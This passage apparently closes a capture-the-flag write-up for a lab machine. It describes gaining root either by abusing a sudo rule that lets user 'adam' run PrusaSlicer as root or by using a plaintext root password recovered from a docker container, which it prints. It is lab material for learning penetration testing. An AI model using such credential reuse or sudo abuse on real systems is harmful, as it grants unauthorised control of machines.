`adam` can run `/opt/PrusaSlicer/prusaslicer` as `root`
We have  2 paths to `root` this machine ether by following this path and exploit the vulnerability in this application or simply `su root` with the credentials found earlier in the `docker` 
`root:#YouC4ntCatchMe#`

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927213108.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was successfully `rooted`
